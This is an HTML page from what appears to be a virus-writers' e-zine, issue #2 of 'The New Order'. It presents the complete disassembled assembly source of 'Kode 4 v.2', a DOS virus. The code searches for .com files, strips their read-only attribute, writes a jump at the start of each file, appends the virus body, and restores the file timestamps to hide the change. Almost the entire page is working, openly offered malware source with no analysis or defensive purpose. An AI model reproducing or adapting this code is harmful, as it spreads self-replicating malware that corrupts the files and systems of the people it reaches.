<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=windows-1251">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
<title>ThE NeW OrDeR #2</title>
</head>

<body bgcolor="#000000" link="#0000FF" vlink="#000080"
bgproperties="fixed" topmargin="15" leftmargin="20" "
vlink="#000080">

<p align="center"><img src="../Images/viruz.gif" width="560"
height="100"></p>

<p align="center"><font color="#FF0000" size="5"><strong><img
src="../images/Rs.jpg" width="640" height="12"></strong></font></p>

<p align="center"><font color="#FF0000" size="5"><strong><img
src="../Images/fogskul.gif" alt="OneHalf  Virii" width="160"
height="100"></strong></font></p>

<p align="center"><font color="#FF0000" size="6"><strong>Kode 4
v.2</strong></font></p>

<p align="left"><font color="#00FFFF"><strong>;
--------------------------------------------------------------------------<br>
; Disassembled by FairWind / NRG , nrgteam@mail.ru<br>
;
--------------------------------------------------------------------------</strong></font></p>

<p align="left"><font color="#FFFFFF"><strong>seg_a segment byte
public<br>
assume cs:seg_a, ds:seg_a<br>
<br>
<br>
org 100h<br>
V_Length equ vend-vstart<br>
KODE4 proc far<br>
start label near<br>
db 0E9h,00h,00h<br>
<br>
<br>
vstart equ $<br>
<br>
mov si,100h<br>
mov di,102h<br>
lback: inc di<br>
mov ax,word ptr [si]<br>
cmp word ptr [di],ax<br>
jne lback<br>
<br>
<br>
mov ax,word ptr [si+1]<br>
cmp ax,word ptr [di+1]<br>
je lout<br>
jmp lback<br>
<br>
lout: add di,3h<br>
sub di,(v_length+100h)<br>
mov si,di<br>
lea di,temp_buff<br>
add di,si<br>
mov ax,word ptr [di]<br>
mov cl,byte ptr [di+2]<br>
mov di,100h<br>
mov word ptr [di],ax<br>
mov byte ptr [di+2],cl<br>
<br>
<br>
mov ah,4Eh<br>
mov dx,offset filename<br>
add dx,si<br>
int 21h<br>
jnc back<br>
jmp done<br>
Back:<br>
mov ah,43h<br>
mov al,0<br>
mov dx,9eh<br>
int 21h<br>
mov ah,43h<br>
mov al,01<br>
and cx,11111110b<br>
int 21h<br>
<br>
mov ax,3D02h<br>
mov dx,9Eh<br>
int 21h<br>
jnc next<br>
jmp done<br>
next: mov bx,ax<br>
mov ah,57h<br>
mov al,0<br>
int 21h<br>
<br>
push cx<br>
push dx<br>
<br>
mov ax,4200h<br>
xor cx,cx<br>
xor dx,dx<br>
int 21h<br>
<br>
<br>
mov ah,3fh<br>
mov cx,3<br>
<br>
mov dx,offset temp_buff<br>
add dx,si<br>
int 21h<br>
<br>
xor cx,cx<br>
xor dx,dx<br>
mov ax,4202h<br>
int 21h<br>
sub ax,3<br>
push ax<br>
mov di,offset temp_buff<br>
add di,si<br>
mov word ptr [j_code2+si],ax<br>
</strong></font><font color="#FFFFFF"><strong><br>
cmp byte ptr [di],0e9h<br>
jne infect<br>
<br>
mov cx,word ptr [di+1]<br>
pop ax<br>
sub ax,v_length<br>
cmp ax, cx<br>
jne infect<br>
jmp finish<br>
<br>
<br>
<br>
infect:<br>
<br>
xor cx,cx<br>
xor dx,dx<br>
mov ax,4200h<br>
int 21h<br>
<br>
mov ah,40h<br>
mov cx,3<br>
mov dx, offset j_code1<br>
add dx,si<br>
int 21h<br>
<br>
xor cx,cx<br>
xor dx,dx<br>
mov ax, 4202h<br>
int 21h<br>
<br>
mov dx,offset vstart<br>
add dx,si<br>
mov cx,(vend-vstart)<br>
mov ah,40h<br>
int 21h<br>
<br>
<br>
Finish: pop dx<br>
pop cx<br>
mov ah,57h<br>
mov al,01h<br>
int 21h<br>
<br>
mov ah,3Eh<br>
int 21h<br>
<br>
mov ah,4Fh<br>
int 21h<br>
jc done<br>
jmp back<br>
<br>
done:<br>
mov bp,100h<br>
jmp bp<br>
<br>
<br>
filename db &quot;*.com&quot;,0<br>
DATA db &quot; -=+ Kode4 +=-, The one and ONLY!$&quot;<br>
<br>
j_code1 db 0e9h<br>
j_code2 db 00h,00h<br>
temp_buff db 0cdh,020h,090h ; CD 20 NOP<br>
kode4 endp<br>
<br>
vend equ $<br>
<br>
seg_a ends<br>
<br>
end start</strong></font></p>

<p align="center"><a href="../TNO#2_start.htm"><img
src="../images/14ic3.gif" border="0" width="60" height="65"></a></p>

<p align="center"><a href="mailto:nrgteam@mail.ru"><img
src="../images/coollogo_com_7565375.jpg" border="0" width="206"
height="53"></a></p>
</body>
</html>
